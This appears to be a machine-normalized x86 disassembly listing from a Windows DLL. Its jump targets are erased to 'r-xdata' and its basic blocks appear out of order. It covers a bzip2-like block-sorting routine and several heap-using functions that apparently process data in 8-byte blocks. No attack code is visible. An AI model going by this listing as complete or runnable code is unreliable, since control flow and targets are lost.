mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 4 ] eax
mov eax [ ebp + 0x20 ]
inc edi
add ebx 0x4
cmp [ eax ] 0x0
jl r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1000bea7
add esp 0xc
test al al
jne r-xdata
cmp edi [ ebp + 0x18 ]
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1000bea7
add esp 0xc
test al al
je r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1000bea7
add esp 0xc
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
sub_1000c2be
push ebp
mov ebp esp
sub esp 0x4f4
mov [ ebp - 0x1d4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov [ ebp - 0x364 ] eax
mov eax [ ebp + 0x18 ]
push edi
mov esi ecx
mov [ ebp - 0x4f4 ] eax
mov [ ebp + 0x18 ] 0x1
push [ ebp + 0x1c ]
push edi
push ebx
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c08d
mov eax [ ebp + 0x1c ]
add esp 0x1c
cmp [ eax ] 0x0
jl r-xdata
cmp edi 0xe
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
jg r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ esi + eax * 4 ]
mov edx [ edx ]
add eax ebx
sar eax 0x1
mov eax [ esi + eax * 4 ]
add eax edi
movzx eax [ eax + ecx ]
push eax
mov eax [ esi + ebx * 4 ]
add eax edi
mov al [ eax + ecx ]
add edx edi
mov cl [ edx + ecx ]
call sub_1000c2a3
movzx eax al
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x14 ] eax
pop ecx
mov [ ebp - 0x8 ] ebx
mov eax ebx
dec [ ebp + 0x18 ]
mov ecx [ ebp + 0x18 ]
shl ecx 0x2
lea eax [ ebp + ecx - 0x1d4 ]
lea edx [ ebp + ecx - 0x364 ]
mov ebx [ edx ]
lea ecx [ ebp + ecx - 0x4f4 ]
mov edi [ ecx ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x44 ] eax
mov eax [ eax ]
mov ecx ebx
sub ecx eax
cmp ecx 0x14
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] edx
jl r-xdata
mov edx [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] edx
jge r-xdata
mov ecx [ ebp + 0x14 ]
mov ebx [ esi + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi ]
movzx ecx [ ecx + edx ]
sub ecx [ ebp - 0x10 ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov ebx [ ebp - 0xc ]
sub ecx edx
sub edx ebx
cmp edx ecx
mov [ ebp - 0x40 ] ecx
jl r-xdata
mov eax [ ebp - 0x3c ]
inc edi
inc [ ebp + 0x18 ]
mov [ eax ] edi
jmp r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ esi + ecx * 4 ]
mov edx [ ebp + 0x14 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
inc [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] eax
mov [ esi + ecx * 4 ] ebx
jle r-xdata
mov [ ebp - 0x4 ] edx
test edx edx
jle r-xdata
mov edx ecx
inc [ ebp + 0x14 ]
jmp r-xdata
cmp [ ebp + 0x14 ] eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx ]
mov edx [ ebp - 0x8 ]
mov ebx ecx
sub ebx [ ebp - 0x8 ]
sub edx eax
cmp ebx edx
jl r-xdata
lea ecx [ esi + ebx * 4 ]
mov ebx [ ebp + 0x14 ]
sub ebx edx
lea edx [ esi + ebx * 4 ]
cmp [ ebp + 0x14 ] eax
jg r-xdata
mov edx [ esi + eax * 4 ]
mov ebx [ ebp + 0x8 ]
lea ecx [ edx + edi ]
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x4 ] ebx
test ebx ebx
jle r-xdata
mov ebx edx
mov ebx [ ecx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ edx ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x10 ]
mov [ edx ] ebx
add ecx 0x4
add edx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ esi + eax * 4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x40 ]
mov ecx [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
lea ecx [ edx + ecx - 0x1 ]
mov edx [ ebp - 0x14 ]
mov ebx [ edx ]
mov edx [ ebp - 0xc ]
mov [ ebp - 0x38 ] edx
lea eax [ eax + ebx + 0x1 ]
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x30 ] edx
lea edx [ eax - 0x1 ]
mov [ ebp - 0x24 ] edx
lea edx [ edi + 0x1 ]
mov [ ebp - 0x18 ] edx
mov edx ecx
sub edx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ebx
sub ebx eax
cmp edx ebx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x1c ] edi
jge r-xdata
mov edx [ ebp + 0x14 ]
sub ecx ebx
lea edx [ esi + edx * 4 ]
lea ecx [ esi + ecx * 4 + 0x4 ]
mov ecx [ ebp + 0x14 ]
cmp ecx eax
jg r-xdata
dec eax
cmp [ ebp + 0x14 ] eax
jle r-xdata
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov ebx [ edx ]
mov [ ebp + 0x14 ] ebx
mov ebx [ ecx ]
mov [ edx ] ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] ebx
add edx 0x4
add ecx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ebx [ esi + eax * 4 ]
inc [ ebp + 0x14 ]
lea ecx [ esi + ecx * 4 ]
mov edx [ ecx ]
mov [ ecx ] ebx
mov [ esi + eax * 4 ] edx
dec eax
jmp r-xdata
mov ebx [ ebp - 0x2c ]
sub ebx [ ebp - 0x38 ]
mov eax ecx
sub eax edx
cmp ebx eax
jge r-xdata
mov eax edx
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax ecx
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edi
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x30 ]
mov ebx ecx
sub ebx edx
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x38 ]
mov ebx [ ebp - 0x20 ]
mov ebx [ ebp - 0x38 ]
mov eax edx
mov edx ebx
mov ebx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ecx
mov ecx ebx
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov edi [ ebp - 0x44 ]
mov [ edi ] eax
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x2c ]
mov [ eax ] edi
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
mov eax [ ebp + 0x18 ]
inc eax
mov [ ebp + eax * 4 - 0x364 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebp + eax * 4 - 0x4f4 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebp + eax * 4 - 0x1d4 ] edx
inc eax
mov [ ebp + eax * 4 - 0x1d4 ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebp + eax * 4 - 0x364 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebp + eax * 4 - 0x4f4 ] ecx
inc eax
mov [ ebp + 0x18 ] eax
jmp r-xdata
sub_1000c5db
push ebp
lea ebp [ esp - 0x188 ]
sub esp 0xd24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x184 ] eax
mov eax [ ebp + 0x190 ]
mov [ ebp + 0x70 ] eax
mov eax [ ebp + 0x194 ]
push ebx
mov ebx ecx
mov [ ebp + 0x6c ] eax
push edi
mov [ ebp + 0x74 ] ebx
mov eax 0x10000
and [ esi + eax * 4 ] 0x0
dec eax
jns r-xdata
movzx ecx [ ebx ]
mov edx [ ebp + 0x198 ]
shl ecx 0x8
dec edx
cmp edx 0x3
jl r-xdata
test edx edx
jl r-xdata
mov eax [ ebp + 0x6c ]
lea edi [ eax + edx * 2 - 0x4 ]
mov ecx [ ebp + 0x198 ]
mov edx [ ebp + 0x6c ]
xor eax eax
lea edi [ edx + ecx * 2 ]
add ecx ebx
mov edi [ ebp + 0x6c ]
xor eax eax
mov [ edi + edx * 2 ] ax
movzx eax [ ebx + edx ]
shl eax 0x8
sar ecx 0x8
or ecx eax
inc [ esi + ecx * 4 ]
dec edx
jns r-xdata
xor eax eax
mov [ edi + 0x4 ] ax
movzx eax [ ebx + edx ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi + 0x2 ] cx
movzx ecx [ ebx + edx - 0x1 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
xor eax eax
mov [ edi ] ax
movzx eax [ ebx + edx - 0x2 ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi - 0x2 ] cx
movzx ecx [ ebx + edx - 0x3 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
sub edx 0x4
sub edi 0x8
cmp edx 0x3
jge r-xdata
mov dl [ ebx + eax ]
mov [ ecx + eax ] dl
xor edx edx
mov [ edi ] dx
inc eax
inc edi
inc edi
cmp eax 0x22
jl r-xdata
xor ecx ecx
inc ecx
mov edx [ esi + ecx * 4 - 0x4 ]
lea eax [ esi + ecx * 4 ]
add [ eax ] edx
inc ecx
cmp ecx 0x10000
jle r-xdata
movzx ax [ ebx ]
mov edx [ ebp + 0x198 ]
shl ax 0x8
dec edx
cmp edx 0x3
movzx ecx ax
jl r-xdata
test edx edx
jl r-xdata
or [ ebp + 0x7c ] 0xffffffff
sub [ ebp + 0x7c ] ebx
mov [ ebp + 0x80 ] 0xfffffffe
sub [ ebp + 0x80 ] ebx
lea eax [ ebx + edx - 0x1 ]
push 0x100
xor edi edi
lea eax [ ebp + 0x84 ]
push edi
push eax
call sub_10010a00
add esp 0xc
movzx ax [ ebx + edx ]
shl ax 0x8
shr cx 0x8
or ax cx
movzx ecx ax
movzx eax cx
lea edi [ esi + eax * 4 ]
mov eax [ edi ]
dec eax
mov [ edi ] eax
mov edi [ ebp + 0x70 ]
mov [ edi + eax * 4 ] edx
dec edx
jns r-xdata
movzx di [ eax + 0x1 ]
shr cx 0x8
shl di 0x8
or di cx
movzx edi di
movzx ecx di
lea ebx [ esi + ecx * 4 ]
mov ecx [ ebx ]
dec ecx
mov [ ebx ] ecx
mov ebx [ ebp + 0x70 ]
mov [ ebx + ecx * 4 ] edx
movzx cx [ eax ]
shl cx 0x8
shr di 0x8
or cx di
movzx ecx cx
mov [ ebp + 0x78 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
lea edi [ edx - 0x1 ]
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x1 ]
mov ecx [ ebp + 0x78 ]
shl di 0x8
shr cx 0x8
or di cx
movzx ecx di
mov [ ebp + 0x78 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x7c ]
add edi eax
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x2 ]
mov ecx [ ebp + 0x78 ]
shr cx 0x8
shl di 0x8
or di cx
movzx ecx di
mov [ ebp + 0x78 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x80 ]
add edi eax
sub edx 0x4
sub eax 0x4
cmp edx 0x3
mov [ ebx + ecx * 4 ] edi
mov ecx [ ebp + 0x78 ]
jge r-xdata
mov ebx [ ebp + 0x74 ]
mov [ ebp + edi * 4 - 0x39c ] edi
inc edi
cmp edi 0xff
jle r-xdata
xor eax eax
inc eax
imul eax eax 0x3
inc eax
cmp eax 0x100
jle r-xdata
mov [ ebp + 0x80 ] eax
cmp [ ebp + 0x80 ] 0x1
jne r-xdata
lea eax [ ebp - 0x39c ]
mov [ ebp + 0x7c ] eax
mov eax [ ebp + 0x80 ]
push 0x3
cdq
pop ecx
idiv ecx
cmp eax 0xff
mov [ ebp + 0x80 ] eax
mov [ ebp + 0x78 ] eax
jg r-xdata
and [ ebp + 0x68 ] 0x0
and [ ebp + 0x78 ] 0x0
inc [ ebp + 0x78 ]
mov eax [ ebp + 0x68 ]
add [ ebp + 0x7c ] 0x4
cmp [ ebp + 0x78 ] 0xff
mov [ ebp + edi * 4 - 0x39c ] eax
jle r-xdata
mov eax [ ebp + 0x7c ]
jmp r-xdata
inc [ ebp + 0x80 ]
cmp [ ebp + 0x80 ] 0xff
jle r-xdata
shl eax 0x8
add eax [ ebp + 0x80 ]
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x74 ] eax
mov eax [ eax ]
test eax 0x200000
jne r-xdata
mov edi [ ebp + 0x78 ]
mov eax [ ebp + edi * 4 - 0x39c ]
mov ecx [ ebp + 0x7c ]
mov ecx [ ecx ]
mov [ ebp + 0x68 ] eax
shl eax 0xa
shl ecx 0xa
add eax esi
lea edx [ ecx + esi ]
mov ecx [ eax + 0x400 ]
sub ecx [ eax ]
mov eax [ edx + 0x400 ]
sub eax [ edx ]
cmp eax ecx
jbe r-xdata
mov edx [ eax ]
mov [ ebp + edi * 4 - 0x39c ] edx
mov edx [ ebp + 0x80 ]
sub edi edx
shl edx 0x2
sub eax edx
mov edx [ ebp + 0x80 ]
dec edx
cmp edi edx
mov [ ebp + 0x74 ] eax
jle r-xdata
mov eax [ ebp + 0x78 ]
mov eax [ ebp + eax * 4 - 0x39c ]
cmp [ ebp + 0x80 ] eax
je r-xdata
mov eax [ ebp + 0x78 ]
mov eax [ ebp + eax * 4 - 0x39c ]
mov ecx eax
shl ecx 0x2
lea edx [ esi + ecx ]
mov [ ebp + 0x80 ] ecx
mov [ ebp + 0x64 ] edx
xor eax eax
mov eax [ ebp + 0x74 ]
mov ecx 0xffdfffff
and eax ecx
mov [ ebp + 0x7c ] eax
mov eax [ ebp + 0x74 ]
mov edi [ eax + 0x4 ]
and edi ecx
dec edi
cmp edi [ ebp + 0x7c ]
jle r-xdata
mov eax [ eax ]
shl eax 0xa
add eax esi
mov edx [ eax + 0x400 ]
sub edx [ eax ]
cmp edx ecx
ja r-xdata
mov edi [ edx ]
and edi 0xffdfffff
mov [ ebp + eax - 0x79c ] edi
mov edi [ edx + 0x4 ]
and edi 0xffdfffff
dec edi
mov [ ebp + eax - 0xb9c ] edi
add eax 0x4
add edx 0x400
cmp eax 0x3fc
jle r-xdata
mov eax [ ebp + 0x78 ]
mov eax [ ebp + eax * 4 - 0x39c ]
shl eax 0xa
lea edi [ eax + esi ]
mov eax [ edi ]
mov [ ebp + 0x7c ] edi
and eax 0xffdfffff
jmp r-xdata
or [ eax ] 0x200000
push [ ebp + 0x19c ]
mov eax [ ebp + 0x7c ]
mov ecx [ ebp + 0x70 ]
push 0x2
push edi
push [ ebp + 0x198 ]
push [ ebp + 0x6c ]
push ebx
call sub_1000c2be
sub edi [ ebp + 0x7c ]
mov eax [ ebp + 0x68 ]
lea eax [ eax + edi + 0x1 ]
mov [ ebp + 0x68 ] eax
mov eax [ ebp + 0x19c ]
add esp 0x18
cmp [ eax ] 0x0
jl r-xdata
mov eax [ ebp + 0x74 ]
cmp eax [ ebp + ecx - 0x79c ]
jl r-xdata
mov ecx [ ebp + 0x184 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x188
leave
retn
mov edx [ ebp + 0x70 ]
mov edx [ edx + eax * 4 ]
dec edx
jns r-xdata
mov eax [ edi + 0x400 ]
lea ecx [ ebp + ecx - 0xb9c ]
and eax 0xffdfffff
mov [ ebp + 0x80 ] ecx
jmp r-xdata
movzx edi [ ebx + edx ]
cmp [ ebp + edi + 0x84 ] 0x0
jne r-xdata
add edx [ ebp + 0x198 ]
dec eax
cmp eax [ ecx ]
jg r-xdata
mov edi [ ebp + 0x7c ]
inc eax
lea ecx [ ebp + edi * 4 - 0x79c ]
mov edi [ ebp + 0x70 ]
mov [ ebp + 0x74 ] ecx
mov ecx [ ecx ]
mov [ edi + ecx * 4 ] edx
mov edx [ ebp + 0x74 ]
inc ecx
mov [ edx ] ecx
mov ecx [ ebp + 0x80 ]
mov ecx [ ebp + 0x70 ]
mov edx [ ecx + eax * 4 ]
dec edx
jns r-xdata
mov eax [ ebp + 0x64 ]
mov ecx 0x100
movzx ecx [ ebx + edx ]
cmp [ ebp + ecx + 0x84 ] 0x0
jne r-xdata
add edx [ ebp + 0x198 ]
or [ eax ] 0x200000
add eax 0x400
dec ecx
jne r-xdata
mov ecx [ ebp + 0x78 ]
cmp ecx 0xff
mov eax [ ebp + ecx * 4 - 0x39c ]
mov [ ebp + eax + 0x84 ] 0x1
jge r-xdata
mov ecx [ ebp + 0x80 ]
mov edi [ ebp + 0x70 ]
lea ecx [ ebp + ecx * 4 - 0xb9c ]
mov [ ebp + 0x74 ] ecx
mov ecx [ ecx ]
mov [ edi + ecx * 4 ] edx
mov edx [ ebp + 0x74 ]
mov edi [ ebp + 0x7c ]
dec ecx
mov [ edx ] ecx
inc [ ebp + 0x78 ]
cmp [ ebp + 0x78 ] 0xff
jle r-xdata
mov edx [ edi ]
mov eax [ edi + 0x400 ]
and [ ebp + 0x7c ] 0x0
mov ecx 0xffdfffff
and edx ecx
and eax ecx
sub eax edx
cmp eax 0xfffe
jle r-xdata
and [ ebp + 0x80 ] 0x0
dec eax
js r-xdata
inc [ ebp + 0x7c ]
mov ecx [ ebp + 0x7c ]
mov edi eax
sar edi cl
cmp edi 0xfffe
jg r-xdata
mov ecx [ ebp + 0x70 ]
add edx eax
lea ecx [ ecx + edx * 4 ]
mov [ ebp + 0x80 ] ecx
sub [ ebp + 0x80 ] 0x4
dec eax
test eax eax
jge r-xdata
mov edi [ ebp + 0x198 ]
add edx edi
mov edi [ ebp + 0x6c ]
mov [ edi + edx * 2 ] cx
mov ecx [ ebp + 0x80 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x7c ]
mov edi eax
sar edi cl
cmp edx 0x22
movzx ecx di
mov edi [ ebp + 0x6c ]
mov [ edi + edx * 2 ] cx
jge r-xdata
sub_1000cb92
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x20 ]
mov ebx [ edi + 0x44 ]
cmp ebx 0x2710
mov edx [ edi + 0x18 ]
mov ecx [ edi + 0x24 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x30 ]
mov [ ebp - 0xc ] edx
jge r-xdata
lea edx [ ebx + 0x22 ]
test dl 0x1
je r-xdata
push ebx
push [ edi + 0x14 ]
mov eax edx
push [ edi + 0x10 ]
call sub_1000bbd6
add esp 0xc
jmp r-xdata
add edx ecx
cmp eax 0x1
mov [ ebp - 0x8 ] edx
jge r-xdata
inc edx
or [ edi + 0x1c ] 0xffffffff
xor eax eax
cmp [ edi + 0x44 ] eax
jle r-xdata
cmp eax 0x64
jle r-xdata
xor eax eax
inc eax
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
push esi
dec eax
push 0x3
pop esi
cdq
idiv esi
mov esi [ ebp - 0xc ]
imul eax ebx
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_1000c5db
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x64
pop eax
mov [ edi + 0x1c ] eax
inc eax
cmp eax [ edi + 0x44 ]
jl r-xdata
pop esi
push ebx
push [ edi + 0x14 ]
mov eax esi
push [ edi + 0x10 ]
call sub_1000bbd6
add esp 0xc
jmp r-xdata
VD
push ebp
mov ebp esp
sub esp 0x78
push esi
push edi
call [ GetProcessHeap@IAT ]
push [ ebp + 0x8 ]
mov esi [ lstrlenA@IAT ]
mov [ ebp - 0x4 ] eax
call esi
xor edi edi
cmp eax edi
jbe r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_1000d6e4
cmp eax edi
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop esi
leave
retn
push [ ebp + 0x10 ]
call esi
cmp eax edi
ja r-xdata
push ebx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push [ ebp + 0x10 ]
call sub_1000d6e4
mov ebx eax
cmp ebx edi
jne r-xdata
lea eax [ ebp - 0x78 ]
push 0x5
push eax
call j_sub_1000d0f6
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
push [ ebp + 0xc ]
mov [ ebp - 0x18 ] edi
call esi
cmp eax edi
mov esi [ HeapFree@IAT ]
mov [ ebp - 0x14 ] eax
ja r-xdata
mov esi [ HeapFree@IAT ]
push ebx
push edi
push [ ebp - 0x4 ]
jmp r-xdata
pop ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] 0x8
sub [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
push ebx
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x4 ]
call esi
mov eax [ ebp - 0x14 ]
cmp eax edi
jbe r-xdata
call esi
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x4 ]
call esi
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x78 ]
push [ ebx + 0x80 ]
push ebx
push eax
call sub_1000d1fc
add esp 0x10
cmp eax edi
push ebx
push edi
push [ ebp - 0x4 ]
je r-xdata
push 0x8
push ecx
lea eax [ ebp - 0x78 ]
push eax
call j_sub_1000d118
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
call esi
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x4 ]
call esi
push 0x5c
lea eax [ ebp - 0x78 ]
push edi
push eax
call sub_1000d091
xor eax eax
add esp 0xc
inc eax
push ebx
push edi
push [ ebp - 0x4 ]
jmp r-xdata
add [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x14 ]
add [ ebp - 0x10 ] 0x8
cmp [ ebp - 0x18 ] eax
jb r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
add edx ecx
cmp edx eax
ja r-xdata
CF
push ebp
mov ebp esp
sub esp 0x1e8
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov edi [ HeapAlloc@IAT ]
push 0x4c4bdc
push 0x8
push eax
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ ebp + 0xc ]
mov esi eax
mov eax ecx
push 0x8
pop ebx
cdq
idiv ebx
and [ ebp - 0x18 ] 0x0
sub ecx edx
add ecx 0x10
mov ebx ecx
push ebx
push 0x8
push [ ebp - 0x4 ]
call edi
push ebx
push 0x0
push eax
mov [ ebp - 0x8 ] eax
call sub_10010a00
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call sub_10010ab0
add esp 0x18
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push [ ebp + 0x10 ]
call sub_1000d6e4
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1000d92a
lea eax [ ebp - 0x44 ]
push eax
push 0x3
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ esi + 0x80 ]
push eax
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
mov [ ebp - 0x14 ] esi
call sub_1000d2d2
add esp 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
call sub_1000d919
pop ecx
xor eax eax
jmp r-xdata
test ebx ebx
mov [ esi + 0x90 ] 0x8
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1a4
lea eax [ ebp - 0x1e8 ]
push 0x0
push eax
call sub_1000d091
lea eax [ ebx + 0x9c ]
mov [ ebp - 0xc ] eax
add esp 0xc
lea eax [ ebp + 0xc ]
push eax
mov [ esi + 0x94 ] ebx
push [ ebp - 0xc ]
push esi
call sub_1000d64d
push [ ebp - 0x10 ]
mov edi [ HeapFree@IAT ]
push 0x0
push [ ebp - 0x4 ]
mov ebx eax
call edi
push [ ebp - 0x8 ]
push 0x0
push [ ebp - 0x4 ]
call edi
push esi
push 0x0
push [ ebp - 0x4 ]
call edi
mov eax ebx
mov edi [ ebp - 0x18 ]
add edi 0x8
cmp edi ebx
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax edi
push 0x8
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ esi + edi + 0x9c ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_1000d396
add esp 0x14
test eax eax
jne r-xdata
OF
push ebp
mov ebp esp
sub esp 0x1b4
push ebx
push edi
call [ GetProcessHeap@IAT ]
mov ebx [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov edi [ lstrlenA@IAT ]
and [ ebx ] 0x0
mov [ ebp - 0x4 ] eax
call edi
test eax eax
ja r-xdata
push esi
lea ecx [ ebp - 0x8 ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_1000d6e4
mov esi eax
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
xor ebx ebx
cmp esi ebx
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
call edi
mov edi eax
cmp edi ebx
ja r-xdata
xor eax eax
jmp r-xdata
pop edi
pop ebx
leave
retn
push [ esi + 0x94 ]
push 0x8
push [ ebp - 0x4 ]
call [ HeapAlloc@IAT ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push [ ebp + 0xc ]
call sub_1000d6e4
push eax
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x80 ]
push eax
push [ esi + 0x8c ]
lea eax [ ebp - 0x1b4 ]
push esi
push 0x3
push eax
call sub_1000d450
mov edi [ HeapFree@IAT ]
add esp 0x18
cmp eax ebx
je r-xdata
push esi
push ebx
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
jmp r-xdata
pop esi
cmp [ esi + 0x94 ] 0x0
jbe r-xdata
push esi
push ebx
push [ esi + 0x94 ]
lea ebx [ esi + 0x9c ]
push 0x0
push ebx
call sub_10010a00
push [ esi + 0x94 ]
push [ ebp + 0x10 ]
push ebx
call sub_10010ab0
mov eax [ esi + 0x94 ]
mov [ esi + 0x98 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x1b4 ]
push eax
call sub_1000d58d
add esp 0x24
push 0x8
lea eax [ esi + ebx + 0x9c ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + ebx - 0x8 ]
push eax
lea eax [ ebp - 0x1b4 ]
push eax
